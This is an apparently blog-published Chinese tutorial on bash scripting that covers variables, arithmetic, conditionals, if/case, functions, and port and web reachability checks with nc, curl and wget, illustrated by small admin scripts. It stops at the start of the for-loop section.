sys_mem_total=`free -h |awk <span class="hljs-string">'NR==2{print $2}'</span>`
sys_mem_free=`free -h |awk <span class="hljs-string">'NR==2{print $NF}'</span>`
sys_load=`<span class="hljs-built_in">uptime</span> |awk <span class="hljs-string">'{print $(NF-2),$(NF-1),$NF}'</span>`

<span class="hljs-comment">#2.输出</span>

<span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF
     主机名：  ${sys_hostname}
     ip地址：  ${sys_ip_addrs}
     总内存：  ${sys_mem_total}
     可用内存：${sys_mem_free}
     系统负载：${sys_load}
EOF</span>

<span class="hljs-comment">#创建软链接到指定目录  用户登录会加载/etc/profile.d/目录下以.sh结尾的文件</span>
<span class="hljs-built_in">ln</span> -s /server/scripts/devops-shell/02.sys_login_info.sh /etc/profile.d/sys_login_info.sh
</code></pre>
<h4 data-id="heading-5">4.特殊变量</h4>
<h5 data-id="heading-6">4.1特殊变量-位置变量</h5>



































<table><thead><tr><th>变量</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>$n</td><td>执行脚本后面的第n个参数   n表示数字</td><td>命令行与脚本内部桥梁</td></tr><tr><td>$0</td><td>获取脚本的名字</td><td>用于输出脚本的格式或帮助的时候。用于错误提示输出帮助</td></tr><tr><td>$#</td><td>统计脚本的参数个数</td><td>一般与判断结合，检查脚本参数个数</td></tr><tr><td>$@</td><td>循环取出脚本所有参数</td><td>数组中或循环中</td></tr><tr><td>$*</td><td>取出脚本所有参数</td><td>数组中或循环中</td></tr></tbody></table>
<h5 data-id="heading-7">4.2特殊变量-状态变量</h5>

























<table><thead><tr><th>变量</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>$?</td><td>上一个命令、脚本的返回值。0表示正确，非0即错误</td><td>一般用于判断检查命令结果</td></tr><tr><td>$$</td><td>当前脚本的pid</td><td>一般写在脚本中获取脚本pid</td></tr><tr><td>$!</td><td>上一个脚本/命令的pid</td><td/></tr></tbody></table>
<h5 data-id="heading-8">4.3特殊变量-变量子串</h5>
<ul>
<li><strong>${#parameter}</strong>    统计字符长度（变量中有多少个字符）</li>
</ul>
<h3 data-id="heading-9">二、shell自动化编程-运算符-条件表达式-if</h3>
<h4 data-id="heading-10">1.运算方法</h4>








































<table><thead><tr><th>运算的命令/符号</th><th>说明</th><th>应用场景</th></tr></thead><tbody><tr><td>awk</td><td>可以进行计算，带小数，可以与shell脚本进行变量传递</td><td/></tr><tr><td>bc</td><td>带小数</td><td>一般计算都可以用bc.需要安装</td></tr><tr><td>expr</td><td>进行计算,整数</td><td>一般用于检查输入内容是否为数字</td></tr><tr><td>let</td><td>进行计算,整数,变量直接使用即可</td><td>用于计算i++</td></tr><tr><td>$(())</td><td>进行计算,整数,变量直接使用即可</td><td/></tr><tr><td>$[]</td><td>进行计算,整数,变量直接使用即可</td><td/></tr></tbody></table>
<h5 data-id="heading-11">1.1 awk进行计算</h5>
<pre><code class="hljs language-sh" lang="sh">awk <span class="hljs-string">'BEGIN{print 1/3}'</span>
awk <span class="hljs-string">'BEGIN{print 1/3*100}'</span>

<span class="hljs-comment">#在awk中使用shell变量</span>
<span class="hljs-comment">#awk -v选项用于创建或修改awk中的变量。 -v是shell脚本与awk桥梁</span>
<span class="hljs-comment">#在awk中各种变量直接使用即可，不要加上$n1,如果加上了会被awk识别为取列</span>
awk -vn1=1  -vn2=3  <span class="hljs-string">'BEGIN{print n1/n2}'</span>
</code></pre>
<h5 data-id="heading-12">1.2 bc用法</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#-l显示小数</span>
<span class="hljs-built_in">echo</span> 1/3 |bc -l
<span class="hljs-built_in">echo</span> 2^10 |bc -l
</code></pre>
<h5 data-id="heading-13">1.3 expr</h5>
<ul>
<li>使用注意事项：使用空格，对*号转义</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 ~]<span class="hljs-comment"># expr 1+1</span>
1+1
[root@m01 ~]<span class="hljs-comment"># expr 1 + 1</span>
2
[root@m01 ~]<span class="hljs-comment"># expr 2 * 2</span>
<span class="hljs-built_in">expr</span>: 语法错误
[root@m01 ~]<span class="hljs-comment"># expr 2 \* 2</span>
4
[root@m01 ~]<span class="hljs-comment"># expr 2 / 2</span>
1
</code></pre>
<ul>
<li>案例：对输入的内容检查是否为数字</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 03.check-num.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:03.check-num.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.vars</span>
<span class="hljs-comment">#num=$1</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入数字："</span> num

<span class="hljs-comment">#2.检查是否为数字</span>
<span class="hljs-built_in">expr</span> <span class="hljs-variable">$num</span> \* 0 + 1 &amp;&gt;/dev/null &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num</span>是数字"</span>
<span class="hljs-built_in">expr</span> <span class="hljs-variable">$num</span> \* 0 + 1 &amp;&gt;/dev/null || <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num</span>不是数字"</span>

</code></pre>
<h5 data-id="heading-14">1.4 let   <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(())   </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">((</span><span class="mclose">))</span></span></span></span></span>[]</h5>
<pre><code class="hljs language-sh" lang="sh">n1=666
n2=999
<span class="hljs-built_in">let</span> c=n1+n2 

n1=666
n2=999
<span class="hljs-built_in">echo</span> $((n1+n2))

n1=666
n2=999
e=$[n1+n2]
</code></pre>
<p>案例：计算传入的两个参数的值</p>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 04.calc_num.sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:04.calc_num.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.vars</span>
num1=<span class="hljs-variable">$1</span>
num2=<span class="hljs-variable">$2</span>

<span class="hljs-comment">#2.检查是否位数字</span>
<span class="hljs-built_in">expr</span> <span class="hljs-variable">$num1</span> \* 0 + <span class="hljs-variable">$num2</span> \* 0 + 1 &amp;&gt;/dev/null || {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$0</span> 数字1 数字2，2个数字"</span>
  <span class="hljs-built_in">exit</span> 1
}

<span class="hljs-comment">#3.计算</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1+n2}'</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1-n2}'</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1*n2}'</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1/n2}'</span>

</code></pre>
<h4 data-id="heading-15">2.条件表达式</h4>
<ul>
<li>大部分情况下使用[ ]进行判断</li>
<li>使用正则的时候用[[ ]]两对中括号</li>
</ul>
<h5 data-id="heading-16">2.1条件表达式符号</h5>

















































<table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>-f</td><td>file  判断是否为文件，是为真</td></tr><tr><td>-d</td><td>dir  判断是否为目录，是为真</td></tr><tr><td>-x</td><td>判断是否有执行权限，是为真</td></tr><tr><td>-s</td><td>判断文件内容是否为空 ，非空为真</td></tr><tr><td>-r</td><td>是否有读权限</td></tr><tr><td>-w</td><td>是否有写权限</td></tr><tr><td>-nt</td><td>两个文件修改时间，是否更加新</td></tr><tr><td>-ot</td><td>两个文件修改时间，是否更加老</td></tr><tr><td>-L</td><td>软链接</td></tr><tr><td>-e</td><td>是否存在（任何类型文件）</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#判断文件是否存在</span>
[ -f /etc/hosts ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>


<span class="hljs-comment">#检查目录是否存在</span>
[ -d /etc/ ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>

<span class="hljs-comment">#检查/etc/rc.d/rc.local是否有执行权限</span>
[ -x /etc/rc.d/rc.local ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>
<span class="hljs-comment">#ip命令是否有执行权限，如果没有则退出</span>
[ -x /sbin/ip ] || <span class="hljs-built_in">exit</span> 1

<span class="hljs-comment">#-s检查文件内容是否为空，非空则为真</span>
[ -s /etc/hosts ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>
</code></pre>
<blockquote>
<p>注意：</p>
<p>​	&amp;&amp; 表示前面命令执行成功然后执行echo 成立。</p>
<p>​	|| 表示前面命令执行失败了，echo 失败</p>
</blockquote>
<h5 data-id="heading-17">2.2对比字符串</h5>

















<table><thead><tr><th>字符串对比</th><th>说明</th></tr></thead><tbody><tr><td>"str1" =  "str2"</td><td>str1等于str2，则为真</td></tr><tr><td>-z  "str"</td><td>zero 检查str字符串是否为空，空的则为真</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">[ <span class="hljs-string">"<span class="hljs-variable">$UID</span>"</span> != <span class="hljs-string">"0"</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 4 <span class="hljs-comment">#判断是否为root执行</span>

[ -z  <span class="hljs-string">"<span class="hljs-variable">$str</span>"</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>
</code></pre>
<h5 data-id="heading-18">2.3比大小（整数）   [ ]</h5>
<ul>
<li>-eq      equal              等于</li>
<li>ne       not   equal     不等于</li>
<li>-gt   great than         大于</li>
<li>-ge  great  equal      大于等于</li>
<li>-lt    less   than         小于</li>
<li>-le   less    equal      小于等于</li>
</ul>
<h5 data-id="heading-19">2.4逻辑判断</h5>
<ul>
<li>多个条件同时成立，或者，取反</li>
</ul>

























<table><thead><tr><th>条件表达式</th><th>[ ]</th></tr></thead><tbody><tr><td>与（同时成立）</td><td>条件1  -a   条件2   （and）</td></tr><tr><td>或</td><td>条件1  -r   条件2     （or）</td></tr><tr><td>非</td><td>!</td></tr><tr><td/><td/></tr></tbody></table>
<h5 data-id="heading-20">2.5正则     [[ ]]</h5>
<pre><code class="hljs language-sh" lang="sh">num=666
[[ <span class="hljs-variable">$num</span> =~ [0-9] ]] &amp;&amp; <span class="hljs-built_in">echo</span> 成立 || <span class="hljs-built_in">echo</span> 失败

num=liux996
[[ <span class="hljs-variable">$num</span> =~ [0-9] ]] &amp;&amp; <span class="hljs-built_in">echo</span> 成立 || <span class="hljs-built_in">echo</span> 失败
<span class="hljs-comment">#前的正则，仅仅表示变量中只要有数字就行</span>


<span class="hljs-comment">#用正则精确匹配数字</span>
[[ <span class="hljs-variable">$num</span> =~ ^[0-9]+$ ]] &amp;&amp; <span class="hljs-built_in">echo</span> 成立 ||<span class="hljs-built_in">echo</span> 失败
<span class="hljs-comment">#变量的值 开头结尾中间全是数字 连续数字</span>
</code></pre>
<h5 data-id="heading-21">2.6 案例：比较两个数字的大小</h5>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim compare_num.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:compare_num.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment">#1.vars</span>
num1=<span class="hljs-variable">$1</span>
num2=<span class="hljs-variable">$2</span>

<span class="hljs-comment">#2.检查是否为数字</span>
[[ <span class="hljs-variable">$num1</span> =~ ^-?[0-9]+$ ]] || {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 不是数字"</span>
  <span class="hljs-built_in">exit</span> 1
}
[[ <span class="hljs-variable">$num2</span> =~ ^-?[0-9]+$ ]] || {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num2</span> 不是数字"</span>
  <span class="hljs-built_in">echo</span> 1
}

<span class="hljs-comment">#3.比较大小</span>
[ <span class="hljs-variable">$num1</span> -gt <span class="hljs-variable">$num2</span> ] &amp;&amp; {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 大于 <span class="hljs-variable">$num2</span>"</span>
}

[ <span class="hljs-variable">$num1</span> -lt <span class="hljs-variable">$num2</span> ] &amp;&amp; {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 小于 <span class="hljs-variable">$num2</span>"</span>
}
[ <span class="hljs-variable">$num1</span> -eq <span class="hljs-variable">$num2</span> ] &amp;&amp; {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 等于 <span class="hljs-variable">$num2</span>"</span>
}


<span class="hljs-comment">#测试</span>
[root@m01 devops-shell]<span class="hljs-comment"># sh compare_num.sh 1 -1</span>
1 大于 -1

</code></pre>
<h4 data-id="heading-22">3.if判断</h4>
<ul>
<li>单分支判断</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> 条件;<span class="hljs-keyword">then</span>
   满足条件后执行的内容。
<span class="hljs-keyword">fi</span>
</code></pre>
<ul>
<li>双分支判断</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> 条件;<span class="hljs-keyword">then</span>
   满足条件后执行的内容。
<span class="hljs-keyword">else</span>
   不满足条件执行的内容。
<span class="hljs-keyword">fi</span>
</code></pre>
<ul>
<li>多分枝判断</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> 条件;<span class="hljs-keyword">then</span>
   满足条件后执行的内容。
<span class="hljs-keyword">elif</span> 条件;<span class="hljs-keyword">then</span>   <span class="hljs-comment">#else if </span>
   满足<span class="hljs-keyword">elif</span>条件，执行的内容。
<span class="hljs-keyword">elif</span> 条件;<span class="hljs-keyword">then</span>
   满足<span class="hljs-keyword">elif</span>条件，执行的内容。   
<span class="hljs-keyword">else</span>
   不满足条件执行的内容。
<span class="hljs-keyword">fi</span>
</code></pre>
<p><strong>案例1：检查根分区磁盘空间使用率</strong></p>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 05.disk_check.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#1.vars</span>
root_usage_now=`<span class="hljs-built_in">df</span> -h |awk -F <span class="hljs-string">"[ %]+"</span> <span class="hljs-string">'$NF=="/" {print $(NF-1)}'</span>`
root_usage_warning=80

<span class="hljs-comment">#2.进行比较</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$root_usage_now</span> -gt <span class="hljs-variable">$root_usage_warning</span> ];<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"磁盘空间不足，使用率是<span class="hljs-variable">$root_usage_now</span>%"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"磁盘空间足，使用率是<span class="hljs-variable">$root_usage_now</span>%"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p><strong>案例2：输出指定用户的信息</strong></p>
<ul>
<li>
<p>执行脚本输入用户名(参数/read)</p>
</li>
<li>
<p>判断用户是否存在,如果不存在则提示用户不存在,退出脚本.</p>
</li>
<li>
<p>如果用户存在输出用户的信息.</p>
<ul>
<li>
<p>是否可以登录(命令解释器)</p>
</li>
<li>
<p>uid,gid(过滤)</p>
</li>
<li>
<p>用户家目录</p>
</li>
<li>
<p>最近1次登录情况</p>
</li>
<li>
<p>属于用户的文件(很多)</p>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 06.secure_check_user.sh</span>

<span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment">#1.输入用户名</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入用户名"</span> user

<span class="hljs-comment">#2.检查用户是否存在</span>
<span class="hljs-comment">#判断输入变量不能为空</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">${user}</span>x"</span> = <span class="hljs-string">"x"</span> ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"请输入用户名："</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#是否存在</span>
<span class="hljs-built_in">id</span> <span class="hljs-variable">$user</span> &amp;&gt;/dev/null
<span class="hljs-keyword">if</span> [ $? -ne 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"用户<span class="hljs-variable">$user</span> 不存在"</span>
    <span class="hljs-built_in">exit</span> 2
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#3.用户信息</span>
user_shell=`awk -F: -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name{print $NF}'</span> /etc/passwd`
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$user_shell</span>"</span> = <span class="hljs-string">"/bin/bash"</span> ];<span class="hljs-keyword">then</span>
     if_login=<span class="hljs-string">"可以登录"</span>
<span class="hljs-keyword">else</span>
     if_login=<span class="hljs-string">"无法登录"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#uid，gid,家目录</span>
user_ids=`awk -F: -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name{print $3,$4}'</span> /etc/passwd`
user_homedir=`awk -F: -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name{print $(NF-1)}'</span> /etc/passwd`

<span class="hljs-comment">#最近登录信息</span>
user_login_info=`lastlog |awk -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name'</span>`

<span class="hljs-comment">#用户文件信息</span>
user_files=`find / -<span class="hljs-built_in">type</span> f -user liux 2&gt;/dev/null`

<span class="hljs-comment">#4.输出</span>

<span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF
     用户名：$user
     是否可以登录：$if_login
     用户uid，gid：$user_ids
     用户家目录：$user_homedir
     最近的登录情况：$user_login_info
     用户的文件：$user_files
EOF</span>

</code></pre>
<h4 data-id="heading-23">4.case语句</h4>
<ul>
<li>
<p>条件分支语句，一般用于实现有多种选择的脚本</p>
</li>
<li>
<p>case语句功能，可以通过if+elif+else形式进行替换</p>
</li>
<li>
<p>格式</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">case</span> <span class="hljs-string">"变量"</span>  <span class="hljs-keyword">in</span>  
   1)
         命令;;
   2)
         命令;;
   *)
         命令（保底的默认输出）
<span class="hljs-keyword">esac</span>
</code></pre>
<h4 data-id="heading-24">5.shell编程-函数</h4>
<ul>
<li>格式</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#定义方式01 最完整</span>
<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">lidao_show</span></span>() {
内容
 <span class="hljs-built_in">return</span> n  <span class="hljs-comment">#函数的返回值</span>
}
<span class="hljs-comment">#定义方式02   精简写法 一般使用这一种.</span>
<span class="hljs-function"><span class="hljs-title">lidao_show</span></span>() {
命令
 <span class="hljs-built_in">return</span> n  <span class="hljs-comment">#函数的返回值</span>
}
</code></pre>
<ul>
<li>函数传参</li>
</ul>






























<table><thead><tr><th>参数</th><th>shell脚本中</th><th>函数中</th></tr></thead><tbody><tr><td>$n</td><td>脚本的第n个参数</td><td>函数的第n个参数</td></tr><tr><td>$0</td><td>脚本的名字</td><td>脚本的名字</td></tr><tr><td>$#</td><td>脚本的参数个数</td><td>函数的参数个数</td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">@</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">@/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">@/</span></span></span></span></span>*</td><td>脚本的所有参数</td><td>函数的所有参数</td></tr></tbody></table>
<p><strong>案例：书写sersync服务的管理脚本</strong></p>
<ul>
<li>
<p>sh data_sync.sh start|stop|restart|status</p>
</li>
<li>
<p>需求</p>
<ul>
<li>
<p>如果用户输入的是start,则运行sersync启动的命令。</p>
</li>
<li>
<p>如果用户输入的是stop,则运行关闭sersync的命令。</p>
</li>
<li>
<p>如果用户输入的是status，则显示sersync是否运行中，pid。</p>
</li>
<li>
<p>如果用户输入的是restart,则运行stop的命令，然后运行start的命令。</p>
</li>
<li>
<p>如果用户输入的是其他的内容，则提示输入错误，提示格式。</p>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim  07.data_sync.sh </span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:07.data_sync.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:sersync服务管理脚本</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.vars命令行传参</span>
choice=<span class="hljs-variable">$1</span>
sersync_dir=/app/tools/sersync
srv_status=`ps -ef|grep sersync |egrep -v <span class="hljs-string">"grep|<span class="hljs-variable">$0</span>"</span> |<span class="hljs-built_in">wc</span> -l`
<span class="hljs-comment">#2.书写功能对应的函数</span>
<span class="hljs-function"><span class="hljs-title">start</span></span>() {
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$srv_status</span> -eq 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-variable">${sersync_dir}</span>/bin/sersync -rdo <span class="hljs-variable">${sersync_dir}</span>/conf/confxml.xml &amp;&gt;/dev/null
  <span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is already running"</span>
  <span class="hljs-keyword">fi</span>
}
<span class="hljs-function"><span class="hljs-title">stop</span></span>() {
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$srv_status</span> -eq 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is already stopped"</span>
  <span class="hljs-keyword">else</span>
    pkill sersync
  <span class="hljs-keyword">fi</span>
}
<span class="hljs-function"><span class="hljs-title">restart</span></span>() {
  pkill sersync
  <span class="hljs-variable">${sersync_dir}</span>/bin/sersync -rdo <span class="hljs-variable">${sersync_dir}</span>/conf/confxml.xml &amp;&gt;/dev/null
}
<span class="hljs-function"><span class="hljs-title">status</span></span>() {
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$srv_status</span> -eq 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is not running"</span>
  <span class="hljs-keyword">else</span>
    pid=`ps -ef|grep sersync |egrep -v <span class="hljs-string">"grep|<span class="hljs-variable">$0</span>"</span> |awk <span class="hljs-string">'{print $2}'</span>`
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is running,pid is <span class="hljs-variable">$pid</span>"</span>
  <span class="hljs-keyword">fi</span>

}
<span class="hljs-comment">#3.case语句</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  <span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$choice</span>"</span> <span class="hljs-keyword">in</span>
    start)
          start
          ;;
    stop)
          stop
          ;;
    restart)
          restart
          ;;
    status)
          status
          ;;
    *)
          <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage:<span class="hljs-variable">$0</span> {start|stop|restart|status}"</span>
  <span class="hljs-keyword">esac</span>
}

main


<span class="hljs-comment">#测试</span>
sh 07.data_sync.sh status
</code></pre>
<h4 data-id="heading-25">6.必知必会命令</h4>
<h5 data-id="heading-26">6.1 检查端口</h5>
<pre><code class="hljs language-sh" lang="sh">检查端口是否存在
ss -lntup |grep 80
netstat -lntup |grep 80
lsof -i:80

<span class="hljs-comment">#检查ip、端口能否访问</span>
telnet 
nc 
<span class="hljs-comment">#-z 无io模式，用于检查端口是否连通。</span>
nc -z 10.0.0.61 80

nmap
</code></pre>
<h5 data-id="heading-27">6.2 检查进程</h5>
<pre><code class="hljs language-sh" lang="sh">top ps
</code></pre>
<h5 data-id="heading-28">6.3 检查网络</h5>
<pre><code class="hljs language-sh" lang="sh">ping -c2 www.baidu.com
iftop
</code></pre>
<h5 data-id="heading-29">6.4 检查web 域名或ip能否访问</h5>
<pre><code class="hljs language-sh" lang="sh">curl/wget
<span class="hljs-comment">#-v显示过程   -I获取响应头</span>
<span class="hljs-comment">#-s slient 安静模式 如果不使用默认输出下载进度</span>
<span class="hljs-comment">#-o curl的输出到指定位置的文件</span>
<span class="hljs-comment">#-w 按照指定格式与内容输出 %{http_code}状态码   更多格式 man </span>
curl 搜索 variable
curl: -v -L -H -I -w -o

<span class="hljs-comment">#-t 失败后，重复尝试次数、-T timeout 超时时间 -q 不显示wget输出  --spider 不下载文件,仅访问</span>
wget -t 3 -T 1 -q --spider www.baidu.com
</code></pre>
<p><strong>案例：检查指定地址和端口是否可以访问</strong></p>
<ul>
<li>sh  check_access.sh  10.0.0.61  22</li>
<li>nc</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># cat 08.check_access.sh </span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:08.check_access.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:检查指定ip和端口是否可以访问</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#加载系统内置函数库</span>
. /etc/init.d/functions

addr=<span class="hljs-variable">$1</span>
port=<span class="hljs-variable">$2</span>

<span class="hljs-comment">#检查nc命令是否存在</span>
<span class="hljs-function"><span class="hljs-title">check_nc</span></span>() {
  <span class="hljs-built_in">which</span> nc &amp;&gt;/dev/null || {
    yum -y install nc
  }
}
<span class="hljs-comment">#检查域名和ip是否合法</span>
<span class="hljs-function"><span class="hljs-title">check_valid</span></span>() {
  [[ <span class="hljs-string">"<span class="hljs-variable">$addr</span>"</span> =~ ^([0-9.]+|[a-z.]+)$ ]] || {
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"输入的域名不合法，<span class="hljs-variable">$addr</span>"</span>
     <span class="hljs-built_in">exit</span> 1
  }
  [[ <span class="hljs-string">"<span class="hljs-variable">$port</span>"</span> =~ ^[0-9]+$ ]] || {
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"输入的ip不合法，<span class="hljs-variable">$port</span>"</span>
     <span class="hljs-built_in">exit</span> 1
  }

}  
<span class="hljs-comment">#用nc命令检查</span>
<span class="hljs-function"><span class="hljs-title">check_port</span></span>() {
  nc -z <span class="hljs-variable">$addr</span> <span class="hljs-variable">$port</span>
  <span class="hljs-keyword">if</span> [ $? -eq 0 ];<span class="hljs-keyword">then</span>
      action <span class="hljs-string">"可以访问，是通的"</span> /bin/true
  <span class="hljs-keyword">else</span>
      action <span class="hljs-string">"无法访问"</span> /bin/false
  <span class="hljs-keyword">fi</span>
}
<span class="hljs-comment">#调用函数</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  check_nc
  check_valid
  check_port
}
main


 “=~” 用于判断左边字符串和右边的正则表达式是否匹配
 正则表达式^表示起始，$表示结束，?表示0个或者1个
</code></pre>
<h3 data-id="heading-30">三、shell自动化编程-循环</h3>
<h4 data-id="heading-31">1.for循环</h4>
<ul>
<li>最常用的for循环方式    大部分场景可用</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span> 变量  <span class="hljs-keyword">in</span> 候补清单（列表）
<span class="hljs-keyword">do</span>
   命令
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#for循环一般搭配着{1..10}  `seq 10`  `ls /etc/`</span>
</code></pre>
<ul>
<li>c语言格式for循环    对数组循环使用</li>
</ul>
